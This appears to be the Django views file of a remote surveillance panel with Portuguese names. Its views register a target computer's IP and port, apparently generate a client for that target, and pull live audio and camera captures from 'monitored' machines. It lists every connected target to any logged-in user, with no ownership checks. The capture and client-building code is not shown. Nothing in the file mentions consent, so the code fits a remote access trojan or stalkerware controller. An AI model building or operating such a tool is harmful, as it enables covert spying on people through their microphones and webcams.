from django.shortcuts import render,redirect
from core.simplecore import CentralCore
from boilerplateDEV import boilerPlate_desktop
from django.contrib.auth.decorators import login_required
from dispositivo.forms import  EnderecoForms
from dispositivo.models import TabelaEnd
from django.contrib import messages


@login_required
def dashboard(request):
    return render(request, "dashboard.html")



@login_required
def configComputador(request):

    form = EnderecoForms(request.POST or None)
    if form.is_valid():
        det = form.data
        port = det["porta"]
        nome = det["nome"]
        end = det["ip"]
        porta_em_uso = TabelaEnd.objects.filter(porta=port).exists()
        if porta_em_uso:
            messages.warning(request, " Porta e uso, por favor escolha outra.")
        else:
            if len(str(port)) <=3 :
                messages.warning(request, " porta acima de 3 digitos numericos .")
            else:
                usuario=  request.user
                dispositivo= "Computador"
                salvar_registro = TabelaEnd( ip=end,porta=port,usuario=usuario,  nome=nome,aparelho=dispositivo)
                salvar_registro.save()
                boilerPlate_desktop.gerador(end,port,nome)

                return redirect("monitoramento")


    return render(request, "conf_computador.html")


@login_required
def capturar_audios(request, audio_id):
    perfil = TabelaEnd.objects.get(id=audio_id)
    if request.method == "GET":
        try:
            ip = str(perfil.ip)
            port = int(perfil.porta)
            monitorado = str(perfil.nome)
            #redirect("monitoramento")

            CentralCore("audio",monitorado,ip,port)
        except Exception:
            return render(request, "erro.html")

    return render(request, "audios.html",{'usuario': perfil})


@login_required
def capturar_camera(request, camera_id):
    perfil = TabelaEnd.objects.get(id=camera_id)
    if request.method == "GET":
        try:
            ip = str(perfil.ip)
            port = int(perfil.porta)
            monitorado = str(perfil.nome)
          #  redirect("monitoramento")

            CentralCore("cam",monitorado,ip,port)
        except Exception:
            return render(request, "erro.html")
    #    redirect("monitoramento")
    return render(request, "camera.html",{'usuario': perfil})
@login_required
def monitorados(request):
    conctado = {"conectados": TabelaEnd.objects.all()}


    return render(request, "monitoramentos.html", conctado)